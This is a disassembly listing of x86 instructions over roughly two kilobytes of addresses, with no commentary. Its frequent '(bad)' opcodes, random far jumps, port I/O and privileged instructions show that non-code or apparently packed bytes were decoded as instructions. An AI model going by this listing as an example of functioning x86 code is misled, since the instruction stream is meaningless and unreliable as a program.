  41e670:	shl    DWORD PTR [ebx+0x75],cl
  41e673:	jl     0x41e693
  41e675:	call   0x73e0:0x4b1b79d1
  41e67c:	mov    dh,0xd2
  41e67e:	adc    eax,0x3c440456
  41e683:	and    ebx,eax
  41e685:	adc    DWORD PTR [ebp-0x18],ecx
  41e688:	and    ecx,DWORD PTR [ecx+0x6c]
  41e68b:	loope  0x41e661
  41e68d:	in     al,0xd
  41e68f:	pop    edi
  41e690:	arpl   WORD PTR [edi+0x12],bp
  41e693:	add    eax,0xd7c114b4
  41e698:	imul   esp,DWORD PTR [eax+0x1383391f],0x4e7f227d
  41e6a2:	and    bh,BYTE PTR [ecx]
  41e6a4:	sbb    BYTE PTR [eax+eiz*2+0x45],bl
  41e6a8:	pop    edx
  41e6a9:	or     ebp,DWORD PTR [ebp-0x8c3fc34]
  41e6af:	sub    DWORD PTR [eax+0x7e923af1],esp
  41e6b5:	int    0xe
  41e6b7:	aaa    
  41e6b8:	push   0x4475a796
  41e6bd:	retf   
  41e6be:	dec    eax
  41e6bf:	add    ah,BYTE PTR [ecx]
  41e6c1:	mov    DWORD PTR [edi],0x82167e9d
  41e6c7:	je     0x41e6ef
  41e6c9:	lods   al,BYTE PTR ds:[esi]
  41e6ca:	js     0x41e6c8
  41e6cc:	sar    BYTE PTR [esi-0xcdb8e3],0x16
  41e6d3:	add    edi,DWORD PTR [edx-0x4]
  41e6d6:	push   esi
  41e6d7:	mov    edi,0xe07fcca6
  41e6dc:	adc    BYTE PTR [eax+0x32c607df],bl
  41e6e2:	mov    ebp,0x203dc999
  41e6e7:	popf   
  41e6e8:	(bad)  
  41e6e9:	adc    al,0x44
  41e6eb:	idiv   DWORD PTR [edx+0x2a]
  41e6ee:	loop   0x41e6cd
  41e6f0:	mov    dh,0x18
  41e6f2:	and    ebx,DWORD PTR [eax]
  41e6f4:	add    cl,dh
  41e6f6:	sbb    dl,dh
  41e6f8:	or     eax,esp
  41e6fa:	or     eax,0xe1763b1e
  41e6ff:	lea    edx,[ebp+0x291cf8e7]
  41e705:	add    BYTE PTR [eax-0x7d],bh
  41e708:	repz mov dh,0x32
  41e70b:	adc    BYTE PTR [eax+edx*8+0x40],al
  41e70f:	xchg   esi,eax
  41e710:	mov    gs,WORD PTR [eax]
  41e712:	gs hlt 
  41e714:	xor    al,0xb9
  41e717:	(bad)  
  41e718:	pusha  
  41e719:	sar    DWORD PTR [edi+0x18],0x60
  41e71d:	push   eax
  41e71e:	data16 es jle 0x41e784
  41e722:	mov    bh,0xb1
  41e724:	mov    BYTE PTR [esi],bh
  41e726:	and    eax,0xcca82dee
  41e72b:	stc    
  41e72c:	mov    ecx,0x82da5d65
  41e731:	mov    ebp,DWORD PTR [ebp-0x10]
  41e734:	cs cdq 
  41e736:	jno    0x41e787
  41e738:	les    edi,FWORD PTR [ebp*2-0x13a63cca]
  41e73f:	jle    0x41e776
  41e741:	shr    BYTE PTR [edx],1
  41e743:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e744:	jno    0x41e700
  41e746:	dec    edx
  41e747:	cmp    BYTE PTR [ecx+edx*1+0x54bf5046],cl
  41e74e:	mov    al,ds:0xc358afc7
  41e753:	nop
  41e754:	fild   QWORD PTR [esi+0x69]
  41e758:	pop    es
  41e759:	repz push cs
  41e75b:	mov    BYTE PTR [edi],dh
  41e75d:	fstp   DWORD PTR [esp+edi*1+0x3410b82f]
  41e764:	adc    esp,DWORD PTR [ecx+0x2e6ac729]
  41e76a:	push   edi
  41e76b:	mov    ebx,0x2b557945
  41e770:	test   eax,0xc501b583
  41e775:	add    ebx,eax
  41e777:	dec    edx
  41e778:	jge    0x41e725
  41e77a:	lock and al,0xf8
  41e77d:	sub    eax,0xecc84de3
  41e782:	(bad)  
  41e783:	stc    
  41e784:	mov    ebp,0xc7c9189c
  41e789:	(bad)  
  41e78a:	jmp    0x41e70f
  41e78c:	inc    ecx
  41e78d:	clc    
  41e78e:	sbb    dh,BYTE PTR [esi+edi*8+0x3f]
  41e792:	cmp    ebp,DWORD PTR [ebp+0x61]
  41e795:	or     BYTE PTR [edi+edx*1-0x1af52b00],al
  41e79c:	scas   al,BYTE PTR es:[edi]
  41e79d:	xor    DWORD PTR [ecx],esi
  41e79f:	mov    dl,0xd6
  41e7a1:	inc    ebx
  41e7a2:	cli    
  41e7a3:	mov    dh,0x33
  41e7a5:	add    BYTE PTR [edi],cl
  41e7a7:	into   
  41e7a8:	or     al,0x6d
  41e7aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7ab:	adc    al,0x19
  41e7ad:	retf   0x31c9
  41e7b0:	fisub  WORD PTR [ebp-0x4cc1f75f]
  41e7b6:	shr    BYTE PTR [ebx],0x9a
  41e7b9:	cdq    
  41e7ba:	pop    ss
  41e7bb:	ficomp DWORD PTR [eax]
  41e7bd:	pop    es
  41e7be:	inc    ebp
  41e7bf:	xchg   DWORD PTR [eax+0x43f73ee5],ebp
  41e7c5:	pop    edx
  41e7c6:	inc    edx
  41e7c7:	push   esi
  41e7c8:	and    eax,0xb6e9fc23
  41e7cd:	push   es
  41e7ce:	test   al,0xa9
  41e7d0:	push   esi
  41e7d1:	jp     0x41e780
  41e7d3:	fwait
  41e7d4:	in     al,dx
  41e7d5:	push   edx
  41e7d6:	ins    BYTE PTR es:[edi],dx
  41e7d7:	cwde   
  41e7d8:	mov    dh,0xb4
  41e7da:	add    eax,0x93eab03c
  41e7df:	test   BYTE PTR [ebx+0x69f029ff],dh
  41e7e5:	(bad)  
  41e7e6:	xor    BYTE PTR [edi-0x5f],bl
  41e7e9:	mov    ecx,0x9267d5b4
  41e7ee:	cmp    DWORD PTR [ebx],edi
  41e7f0:	shl    DWORD PTR [edx],1
  41e7f2:	xchg   esp,eax
  41e7f3:	sub    edx,DWORD PTR [edx+0x75]
  41e7f6:	cmp    DWORD PTR [edx],esp
  41e7f8:	iret   
  41e7f9:	or     eax,0x95602ed3
  41e7fe:	outs   dx,BYTE PTR ds:[esi]
  41e7ff:	mov    eax,ds:0x32e6937a
  41e804:	xchg   ebx,eax
  41e805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e806:	and    eax,0x3ca76705
  41e80b:	add    BYTE PTR [esi-0x21],al
  41e80e:	or     al,0x20
  41e810:	into   
  41e811:	jb     0x41e7d4
  41e813:	fs pusha 
  41e815:	inc    ecx
  41e816:	add    ebp,ebp
  41e818:	test   DWORD PTR [edi+0x737fe0dd],edx
  41e81e:	(bad)  
  41e81f:	mov    bh,0x5d
  41e821:	in     eax,0xfe
  41e823:	arpl   WORD PTR [ebx-0x6eb7f08f],ax
  41e829:	nop
  41e82a:	aam    0xb
  41e82c:	pop    ds
  41e82d:	sti    
  41e82e:	retf   
  41e82f:	add    eax,0x395eae18
  41e834:	and    ebp,DWORD PTR [ebx-0x77]
  41e837:	xor    al,0x75
  41e839:	inc    ebp
  41e83a:	arpl   WORD PTR [esi-0x32],si
  41e83d:	sub    DWORD PTR [ebx],0xffffffdf
  41e840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e841:	or     eax,0x3228a952
  41e846:	jo     0x41e822
  41e848:	test   ah,dh
  41e84a:	jae    0x41e838
  41e84c:	mov    ebp,0xaf209e16
  41e851:	adc    DWORD PTR [ecx],eax
  41e853:	sub    al,0xf6
  41e855:	xor    esi,ecx
  41e857:	es xchg edx,eax
  41e859:	in     eax,0x44
  41e85b:	xor    bl,bl
  41e85d:	ss out 0x7c,eax
  41e860:	push   esp
  41e861:	int    0x12
  41e863:	int3   
  41e864:	add    dl,BYTE PTR [ebp-0x2a]
  41e867:	jecxz  0x41e8e0
  41e869:	mov    BYTE PTR [eax-0x47ddfc62],0xe2
  41e870:	sbb    bl,0x59
  41e873:	shl    BYTE PTR ds:0xdaa1fa50,0xe5
  41e87a:	in     eax,dx
  41e87b:	repnz test BYTE PTR [edx-0x76033aef],ch
  41e882:	sub    BYTE PTR [ebp-0xeca8174],dl
  41e888:	pop    ds
  41e889:	pop    ds
  41e88a:	jp     0x41e86a
  41e88c:	popf   
  41e88d:	or     al,0x5f
  41e88f:	xor    eax,DWORD PTR [edx-0x2e]
  41e892:	cld    
  41e893:	jmp    0x41e8e0
  41e895:	cdq    
  41e896:	aad    0x65
  41e898:	xchg   esp,eax
  41e899:	shr    bl,cl
  41e89b:	aaa    
  41e89c:	mov    edx,0x6a910a4e
  41e8a1:	and    DWORD PTR [ebp+0x68],edx
  41e8a4:	xchg   ebp,eax
  41e8a5:	mov    edi,0x1fba87a
  41e8aa:	mov    edx,0x54765775
  41e8af:	pop    ds
  41e8b0:	and    BYTE PTR [eax],0x50
  41e8b3:	js     0x41e87e
  41e8b5:	call   0x6e37:0x21a31af7
  41e8bc:	xor    eax,DWORD PTR [edi+0x28]
  41e8bf:	xchg   edx,eax
  41e8c0:	sub    ah,BYTE PTR [ebx+0x6b]
  41e8c3:	adc    bh,BYTE PTR [edi-0x8]
  41e8c6:	jne    0x41e936
  41e8c8:	cmp    edi,ebx
  41e8ca:	adc    eax,0x2044c1cb
  41e8cf:	pop    es
  41e8d0:	mov    al,0x39
  41e8d2:	cmp    al,0xe2
  41e8d4:	shr    BYTE PTR [edx],0x77
  41e8d7:	cmp    al,0x45
  41e8d9:	pop    esi
  41e8da:	fnstcw WORD PTR [ebx+0x39671ae1]
  41e8e0:	repz lock jnp 0x41e8d5
  41e8e4:	lock fnsave [eax+0x76]
  41e8e8:	pop    esi
  41e8e9:	es mov esi,0x704f8c73
  41e8ef:	sub    cl,cl
  41e8f1:	inc    edx
  41e8f2:	or     ch,BYTE PTR [ecx-0x923c99a]
  41e8f8:	mov    eax,0xfa97d11
  41e8fd:	hlt    
  41e8fe:	(bad)  
  41e8ff:	and    ch,BYTE PTR [esi-0x4b]
  41e902:	in     eax,dx
  41e903:	xor    DWORD PTR [ecx],ebx
  41e905:	mov    ds:0xeaaaaf1a,al
  41e90a:	mov    bh,0x9b
  41e90c:	xor    BYTE PTR [edx+ebx*2],ah
  41e90f:	inc    edi
  41e910:	mov    dh,0x5b
  41e912:	mov    ds:0x95bab524,eax
  41e917:	fneni(8087 only) 
  41e919:	mov    esp,0x6bb7968c
  41e91e:	rcl    BYTE PTR [edi+eax*8],1
  41e921:	call   0x1fc:0xa74e7b72
  41e928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e929:	pop    ecx
  41e92a:	mov    edi,DWORD PTR [ebx]
  41e92c:	xchg   esp,eax
  41e92d:	adc    eax,0x51fb8cc5
  41e932:	pushf  
  41e933:	aad    0xea
  41e935:	xchg   ebp,eax
  41e936:	mov    BYTE PTR [edi],al
  41e938:	hlt    
  41e939:	dec    ebx
  41e93a:	jecxz  0x41e988
  41e93c:	(bad)  
  41e93d:	repz mov edx,0x28604457
  41e943:	inc    ebx
  41e944:	add    al,0x5e
  41e946:	out    0x84,al
  41e948:	dec    esi
  41e949:	popa   
  41e94a:	push   ds
  41e94b:	lock sbb BYTE PTR ds:0x45eadbb2,al
  41e952:	jne    0x41e938
  41e954:	ss jmp 0xf9ef:0x3604c382
  41e95c:	cmc    
  41e95d:	int3   
  41e95e:	inc    ebx
  41e95f:	lahf   
  41e960:	(bad)  
  41e961:	movsx  edi,WORD PTR [edx+0x762d435e]
  41e968:	call   FWORD PTR ds:0xa4cad41f
  41e96e:	push   es
  41e96f:	add    ch,BYTE PTR [edi]
  41e971:	sbb    BYTE PTR [ecx-0x10],0xae
  41e975:	aam    0x6e
  41e977:	or     ecx,ebp
  41e979:	int3   
  41e97a:	std    
  41e97b:	(bad)  
  41e97c:	imul   DWORD PTR [esi]
  41e97e:	mov    eax,0x1b6088b3
  41e983:	pop    ss
  41e984:	stos   BYTE PTR es:[edi],al
  41e985:	inc    esi
  41e986:	std    
  41e987:	lahf   
  41e988:	sbb    dh,BYTE PTR [edi+0x74]
  41e98b:	(bad)  
  41e98c:	out    dx,al
  41e98d:	cmp    al,0x34
  41e98f:	fwait
  41e990:	mov    eax,ds:0x97ab9031
  41e995:	test   DWORD PTR [edi],esp
  41e997:	leave  
  41e998:	mov    ds:0xb5d0fd8e,eax
  41e99d:	pop    edx
  41e99e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e99f:	stos   DWORD PTR es:[edi],eax
  41e9a0:	mov    ah,0x9c
  41e9a2:	loop   0x41e9eb
  41e9a4:	xchg   ebp,eax
  41e9a5:	les    ecx,FWORD PTR [ecx+eiz*8+0x53]
  41e9a9:	add    BYTE PTR [ecx+edi*8-0x62],cl
  41e9ad:	xchg   esi,edi
  41e9af:	outs   dx,DWORD PTR ds:[esi]
  41e9b0:	jno    0x41e938
  41e9b2:	or     BYTE PTR [ebx-0x23ba0453],dh
  41e9b8:	ss into 
  41e9ba:	or     BYTE PTR [ebp-0x35],bl
  41e9bd:	enter  0x1cd3,0xe8
  41e9c1:	iret   
  41e9c2:	and    al,0x69
  41e9c4:	loop   0x41ea3d
  41e9c6:	push   ebp
  41e9c7:	out    dx,al
  41e9c8:	mov    esi,0x3a3859b2
  41e9cd:	int3   
  41e9ce:	es push ecx
  41e9d0:	(bad)  
  41e9d1:	mov    ds:0x6a208a27,al
  41e9d6:	ret    
  41e9d7:	inc    edi
  41e9d8:	or     al,0xe2
  41e9da:	lea    esi,[edx-0x4b7858e3]
  41e9e0:	push   ebp
  41e9e1:	cmp    eax,0x5d639f98
  41e9e6:	and    al,0x35
  41e9e8:	ret    
  41e9e9:	or     esp,DWORD PTR [edx-0x59847f91]
  41e9ef:	pop    esi
  41e9f0:	iret   
  41e9f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9f2:	rol    DWORD PTR [eax+0x5e],1
  41e9f5:	add    eax,0x92c5802d
  41e9fa:	cli    
  41e9fb:	jecxz  0x41ea72
  41e9fd:	cmp    edx,DWORD PTR [esi]
  41e9ff:	push   cs
  41ea00:	aam    0x5c
  41ea02:	test   bh,dl
  41ea04:	dec    esi
  41ea05:	jnp    0x41e9f8
  41ea07:	rcr    BYTE PTR [edi],0xa9
  41ea0a:	sbb    cl,ah
  41ea0c:	pop    ecx
  41ea0d:	imul   esp,DWORD PTR [eax+ecx*2-0x4e],0xffffffba
  41ea12:	xor    eax,0x667a93bb
  41ea17:	dec    ecx
  41ea18:	shl    DWORD PTR [ebx-0x3d],1
  41ea1b:	fdiv   DWORD PTR [edx]
  41ea1d:	mov    ecx,0x560a4c04
  41ea22:	ins    DWORD PTR es:[edi],dx
  41ea23:	mov    eax,ds:0x53439587
  41ea28:	sub    edi,ecx
  41ea2a:	and    BYTE PTR [ecx],bh
  41ea2c:	sbb    DWORD PTR ds:0x1467997f,edx
  41ea32:	mov    esi,0xa59c99d6
  41ea37:	pushf  
  41ea38:	ds mov al,0xd1
  41ea3b:	imul   edx,DWORD PTR [ecx-0x449600e6],0xfffffff8
  41ea42:	shr    bh,1
  41ea44:	arpl   WORD PTR [ebx],cx
  41ea46:	push   edx
  41ea47:	jmp    0x41ea18
  41ea49:	lds    esi,FWORD PTR [edx-0x3d]
  41ea4c:	xor    eax,0x53aa8067
  41ea51:	pop    ds
  41ea52:	mov    ds:0x4c54c35b,eax
  41ea57:	mov    BYTE PTR ds:0x88dcb19e,al
  41ea5d:	dec    edx
  41ea5e:	bound  esi,QWORD PTR [eax]
  41ea60:	test   bl,bh
  41ea62:	ins    BYTE PTR es:[edi],dx
  41ea63:	scas   al,BYTE PTR es:[edi]
  41ea64:	add    al,0x40
  41ea66:	fcom   QWORD PTR [eax-0x7af13524]
  41ea6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea6d:	cwde   
  41ea6e:	out    0x5b,al
  41ea70:	push   ds
  41ea71:	out    dx,eax
  41ea72:	popa   
  41ea73:	sti    
  41ea74:	add    ebx,DWORD PTR [edx-0x71ad71e1]
  41ea7a:	xor    DWORD PTR [esi+0x0],esp
  41ea7d:	dec    esp
  41ea7e:	add    dh,bh
  41ea80:	xor    al,0x4d
  41ea82:	daa    
  41ea83:	adc    al,0xc3
  41ea85:	push   ebx
  41ea86:	push   edi
  41ea87:	add    DWORD PTR [edx+edi*1],ebp
  41ea8a:	sub    DWORD PTR [esi-0x6644d04e],edx
  41ea90:	sar    DWORD PTR [esi-0x76],1
  41ea93:	jecxz  0x41eb0c
  41ea95:	jbe    0x41eaeb
  41ea97:	aaa    
  41ea98:	add    eax,DWORD PTR [eax-0x32ebf973]
  41ea9e:	or     DWORD PTR [ebp-0x6dbc610a],ecx
  41eaa4:	and    ebp,esi
  41eaa6:	jge    0x41eafd
  41eaa8:	jmp    0x41ea77
  41eaaa:	mov    ebp,ecx
  41eaac:	adc    esi,DWORD PTR [ecx+ecx*1]
  41eaaf:	(bad)  
  41eab0:	imul   ecx,esi,0x62
  41eab3:	sub    al,0xe9
  41eab5:	push   esi
  41eab6:	pusha  
  41eab7:	push   ss
  41eab8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eab9:	and    BYTE PTR [edx-0x47],ch
  41eabc:	sahf   
  41eabd:	sbb    ebx,ecx
  41eabf:	lock rcr DWORD PTR [edi],0x96
  41eac3:	or     bl,BYTE PTR [esi+0x6de4f15e]
  41eac9:	adc    DWORD PTR [edx],ebx
  41eacb:	mov    ah,0xbc
  41eacd:	xor    eax,0x1c7d7cb
  41ead2:	xchg   ebp,eax
  41ead3:	aas    
  41ead4:	mov    esi,0x5a54b445
  41ead9:	jmp    0x7146:0xc3c674c5
  41eae0:	out    dx,al
  41eae1:	es aad 0xbe
  41eae4:	int3   
  41eae5:	fsubr  QWORD PTR [eax+0x1]
  41eae8:	les    edi,FWORD PTR [ebx]
  41eaea:	pop    ebx
  41eaeb:	popa   
  41eaec:	(bad)  
  41eaed:	cmp    ebp,DWORD PTR [edx+esi*8]
  41eaf0:	xchg   ebp,eax
  41eaf1:	mov    eax,ds:0x914a97b
  41eaf6:	outs   dx,BYTE PTR ds:[esi]
  41eaf7:	mov    edx,0x29f2cf01
  41eafc:	jl     0x41ea92
  41eafe:	xor    ch,BYTE PTR [esi-0x4f0716a]
  41eb04:	mov    ?,ebp
  41eb06:	fldcw  WORD PTR [edi]
  41eb08:	adc    al,0xe0
  41eb0a:	frstor [edx+0x74]
  41eb0d:	jns    0x41eb50
  41eb0f:	jnp    0x41eac9
  41eb11:	int3   
  41eb12:	xchg   edi,eax
  41eb13:	sub    BYTE PTR [ebx-0x2fc3b4f1],bl
  41eb19:	fdivr  QWORD PTR [esi+0x5e12b21]
  41eb1f:	into   
  41eb20:	jno    0x41eb35
  41eb22:	mov    edx,0x3f62b6f6
  41eb27:	dec    ebx
  41eb28:	add    al,cl
  41eb2a:	in     eax,0x1e
  41eb2c:	fwait
  41eb2d:	sub    DWORD PTR ds:0x4a3b897b,ecx
  41eb33:	fbld   TBYTE PTR [eax+esi*8-0x52be60d2]
  41eb3a:	add    esp,edx
  41eb3c:	add    eax,0xbcae3d4e
  41eb41:	iret   
  41eb42:	sar    ah,0xf5
  41eb45:	mov    ah,0x9a
  41eb47:	xchg   BYTE PTR [edx],al
  41eb49:	les    ecx,FWORD PTR [ecx+edx*2-0x39]
  41eb4d:	or     al,BYTE PTR [esi+0x10]
  41eb50:	push   0xf0e74f31
  41eb55:	sar    esi,cl
  41eb57:	xchg   dh,al
  41eb59:	add    DWORD PTR [esi+0x106d2f33],0x92976c6a
  41eb63:	daa    
  41eb64:	push   0xffffff8d
  41eb66:	dec    ebx
  41eb67:	sub    DWORD PTR [edx],0x23
  41eb6a:	push   ds
  41eb6b:	jns    0x41eb1e
  41eb6d:	lea    ebp,[esi]
  41eb6f:	cmp    al,0x82
  41eb71:	out    dx,eax
  41eb72:	pop    ds
  41eb73:	dec    edx
  41eb74:	fnstenv [edi+0x30]
  41eb77:	mov    ah,0xf8
  41eb79:	cs pop ebx
  41eb7b:	cmp    BYTE PTR [edi],dh
  41eb7d:	push   edx
  41eb7e:	dec    edx
  41eb7f:	dec    ecx
  41eb80:	lods   al,BYTE PTR ds:[esi]
  41eb81:	inc    esp
  41eb82:	jecxz  0x41ebb6
  41eb84:	cmp    ch,ah
  41eb86:	ror    DWORD PTR [ecx+esi*4],1
  41eb89:	sub    ebx,ebx
  41eb8b:	arpl   bx,bx
  41eb8d:	ins    BYTE PTR es:[edi],dx
  41eb8e:	out    dx,al
  41eb8f:	(bad)  
  41eb90:	aaa    
  41eb91:	jne    0x41eb30
  41eb93:	or     eax,0xe8546451
  41eb98:	aad    0xaf
  41eb9a:	dec    ecx
  41eb9b:	inc    esp
  41eb9c:	popa   
  41eb9d:	push   ebp
  41eb9e:	lds    edx,FWORD PTR [edi]
  41eba0:	xor    DWORD PTR [eax+0x4b],ecx
  41eba3:	imul   edi,ecx,0x99bf1a87
  41eba9:	sbb    al,0x7e
  41ebab:	je     0x41ebe1
  41ebad:	stos   DWORD PTR es:[edi],eax
  41ebae:	xor    BYTE PTR [edi-0x12dc380e],0xa5
  41ebb5:	div    DWORD PTR [ecx-0x22]
  41ebb8:	fdivr  st,st(6)
  41ebba:	cdq    
  41ebbb:	loope  0x41eb93
  41ebbd:	push   cs
  41ebbe:	pop    ss
  41ebbf:	mov    eax,ds:0x944b4a68
  41ebc4:	add    DWORD PTR [ecx],esi
  41ebc6:	mov    ?,WORD PTR [edi-0x4d]
  41ebc9:	and    eax,0x36656435
  41ebce:	popf   
  41ebcf:	adc    eax,0x3369e02c
  41ebd4:	arpl   WORD PTR [edi],di
  41ebd6:	xor    eax,DWORD PTR [ecx+eax*2-0x313d2213]
  41ebdd:	leave  
  41ebde:	jle    0x41ec37
  41ebe0:	retf   
  41ebe1:	push   ebx
  41ebe2:	fsub   st(4),st
  41ebe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebe5:	addr16 aaa 
  41ebe7:	mov    ch,0x58
  41ebe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebea:	inc    ebp
  41ebeb:	push   edi
  41ebec:	imul   ebp,DWORD PTR [ebp-0x38],0x23
  41ebf0:	cwde   
  41ebf1:	inc    edx
  41ebf2:	lds    ebx,FWORD PTR [ebx-0x74]
  41ebf5:	imul   eax,DWORD PTR [edx+0x500b6c25],0xffffffbc
  41ebfc:	lods   eax,DWORD PTR ds:[esi]
  41ebfd:	sbb    BYTE PTR [eax-0x7cc032a9],cl
  41ec03:	jg     0x41ec42
  41ec05:	ins    BYTE PTR es:[edi],dx
  41ec06:	retf   0x5968
  41ec09:	xchg   edx,eax
  41ec0a:	int    0x3f
  41ec0c:	retf   0x9f64
  41ec0f:	or     al,0x5f
  41ec11:	xor    al,0x97
  41ec13:	in     al,dx
  41ec14:	sub    eax,0x5064bd52
  41ec19:	cdq    
  41ec1a:	cmc    
  41ec1b:	xchg   edi,eax
  41ec1c:	push   es
  41ec1d:	mov    BYTE PTR [edx+0x5ff00502],bh
  41ec23:	out    0xdd,al
  41ec25:	fsin   
  41ec27:	pop    ebp
  41ec28:	jne    0x41ebae
  41ec2a:	xchg   esi,eax
  41ec2b:	shl    DWORD PTR ss:[esi-0x792f7635],1
  41ec32:	jg     0x41ebd7
  41ec34:	push   esp
  41ec35:	mov    dl,0x10
  41ec37:	sub    al,0xbf
  41ec39:	jl     0x41ec08
  41ec3b:	mov    ecx,0xb0088fe7
  41ec40:	xchg   ebx,eax
  41ec41:	push   edx
  41ec42:	inc    edi
  41ec43:	pop    ebx
  41ec44:	fild   DWORD PTR gs:[edi-0x6c]
  41ec48:	rcr    DWORD PTR [esi],cl
  41ec4a:	sbb    DWORD PTR ds:0xb1eecf48,0xffffffd5
  41ec51:	jmp    0xdfa1:0xfdf231c6
  41ec58:	scas   al,BYTE PTR es:[edi]
  41ec59:	scas   al,BYTE PTR es:[edi]
  41ec5a:	jmp    0x3752bf81
  41ec5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec60:	mov    gs,ebp
  41ec62:	xor    ebx,DWORD PTR [eax+0x1e]
  41ec65:	jnp    0x41eca4
  41ec67:	add    DWORD PTR [esi+ebx*2],ecx
  41ec6a:	sub    ch,BYTE PTR [ebx-0x38]
  41ec6d:	xchg   DWORD PTR [edx+eiz*2+0x387e427b],edx
  41ec74:	mov    bh,0x67
  41ec76:	nop
  41ec77:	fmul   st,st(6)
  41ec79:	mov    WORD PTR [eax+0x68],?
  41ec7c:	xor    eax,0x7d747b43
  41ec81:	ss push cs
  41ec83:	pop    esp
  41ec84:	iret   
  41ec85:	sbb    BYTE PTR [edx+0x30],0xce
  41ec89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec8a:	pop    esp
  41ec8b:	and    eax,0xd09adf05
  41ec90:	retf   0xd647
  41ec93:	rol    DWORD PTR [edx+edx*4-0x3f3d6370],cl
  41ec9a:	arpl   WORD PTR [esi+0xee2b078],si
  41eca0:	adc    edi,ebx
  41eca2:	dec    eax
  41eca3:	fisub  WORD PTR [edx+ebp*1]
  41eca6:	add    eax,0x1d5d0dc2
  41ecab:	add    DWORD PTR [edi+0x9de480c],ebp
  41ecb1:	test   BYTE PTR [edi],0x3e
  41ecb4:	stos   BYTE PTR es:[edi],al
  41ecb5:	cmp    al,0x84
  41ecb7:	mov    ch,0x6d
  41ecb9:	stc    
  41ecba:	test   BYTE PTR [edi+0x3c],dh
  41ecbd:	ds dec esp
  41ecbf:	mov    ah,0x9
  41ecc1:	push   esp
  41ecc2:	scas   al,BYTE PTR es:[edi]
  41ecc3:	dec    ecx
  41ecc4:	imul   ebx,DWORD PTR [esi],0xffffffd8
  41ecc7:	arpl   di,dx
  41ecc9:	xchg   edx,eax
  41ecca:	sub    DWORD PTR ds:0xc03f9263,esi
  41ecd0:	mov    edx,DWORD PTR [eax+0x50]
  41ecd3:	jp     0x41eca5
  41ecd5:	mov    ecx,0x52267061
  41ecda:	mov    ds:0xedb31880,al
  41ecdf:	xchg   edx,eax
  41ece0:	jb     0x41ed1e
  41ece2:	ss dec esp
  41ece4:	adc    BYTE PTR [edi+0x5c],ah
  41ece7:	daa    
  41ece8:	and    BYTE PTR [edx-0x1d],bl
  41eceb:	int3   
  41ecec:	add    eax,0x78a04290
  41ecf1:	jb     0x41ed19
  41ecf3:	(bad)  
  41ecf4:	pop    esi
  41ecf5:	out    dx,eax
  41ecf6:	add    al,0xe8
  41ecf8:	mov    edi,0xa34ad144
  41ecfd:	lds    esp,FWORD PTR fs:[edx-0x51]
  41ed01:	xchg   DWORD PTR [edx+0x40],edx
  41ed04:	or     DWORD PTR [esi],ecx
  41ed06:	push   cs
  41ed07:	sub    DWORD PTR [ecx],edi
  41ed09:	cmp    ecx,DWORD PTR [esi-0x119aa9c3]
  41ed0f:	sub    ebx,DWORD PTR [ecx]
  41ed11:	shr    DWORD PTR [edx+eiz*8+0x12],0xaf
  41ed16:	rcl    esi,1
  41ed18:	mov    esi,0xa0d723f5
  41ed1d:	adc    edi,0xffffffe7
  41ed20:	pushw  ds
  41ed22:	enter  0x12d8,0x4d
  41ed26:	out    dx,eax
  41ed27:	xchg   ecx,eax
  41ed28:	pop    ss
  41ed29:	test   eax,0x95f90c27
  41ed2e:	in     eax,dx
  41ed2f:	and    eax,edi
  41ed31:	and    eax,0x4feeaa12
  41ed36:	mov    ah,0xf2
  41ed38:	outs   dx,DWORD PTR ds:[esi]
  41ed39:	inc    eax
  41ed3a:	das    
  41ed3b:	pop    es
  41ed3c:	mov    dl,0x8a
  41ed3e:	mov    bh,0x5a
  41ed40:	mov    BYTE PTR [esi+ecx*2],bh
  41ed43:	(bad)  
  41ed44:	das    
  41ed45:	int    0x87
  41ed47:	cmp    al,0x9
  41ed49:	outs   dx,BYTE PTR ds:[esi]
  41ed4a:	jp     0x41edc1
  41ed4c:	ss sbb bl,dl
  41ed4f:	inc    esp
  41ed50:	pop    ebp
  41ed51:	push   0x4c
  41ed53:	fld    DWORD PTR [esi]
  41ed55:	push   edi
  41ed56:	xchg   esi,eax
  41ed57:	mov    edi,0x95700682
  41ed5c:	dec    edx
  41ed5d:	add    al,0xfd
  41ed5f:	add    edx,DWORD PTR [ebx]
  41ed61:	pop    edi
  41ed62:	push   esi
  41ed63:	sub    ebp,edx
  41ed65:	jnp    0x41ed41
  41ed67:	sbb    BYTE PTR [eax],0x6f
  41ed6a:	imul   edx,ecx,0xc5b677e5
  41ed70:	jnp    0x41edbc
  41ed72:	cli    
  41ed73:	dec    esi
  41ed74:	bound  esp,QWORD PTR [ebp-0x50]
  41ed77:	mov    al,0x87
  41ed79:	es aaa 
  41ed7b:	data16 ja 0x41ed7c
  41ed7e:	pop    ecx
  41ed7f:	aad    0xd2
  41ed81:	add    ebp,DWORD PTR [ebp+0x1f]
  41ed84:	sbb    DWORD PTR [edi+0x20],esi
  41ed87:	jmp    FWORD PTR [ebx-0x6d]
  41ed8a:	jecxz  0x41ed88
  41ed8c:	aad    0x39
  41ed8e:	push   ss
  41ed8f:	fisttp WORD PTR [edx]
  41ed91:	mov    eax,eax
  41ed93:	leave  
  41ed94:	xchg   esi,eax
  41ed95:	xchg   ebx,eax
  41ed96:	lods   al,BYTE PTR cs:[esi]
  41ed98:	pusha  
  41ed99:	push   esp
  41ed9a:	(bad)  
  41ed9b:	pop    eax
  41ed9c:	(bad)  
  41ed9e:	adc    al,0xb6
  41eda0:	jno    0x41ed53
  41eda2:	xor    DWORD PTR ds:0xf2912f0f,0x9
  41eda9:	sbb    ebp,edi
  41edab:	dec    esi
  41edac:	test   BYTE PTR [edi-0x8],0x6f
  41edb0:	fadd   st,st(3)
  41edb2:	fist   DWORD PTR [edi-0x49a3d279]
  41edb8:	add    al,0xac
  41edba:	call   0xa2d9:0xcc716519
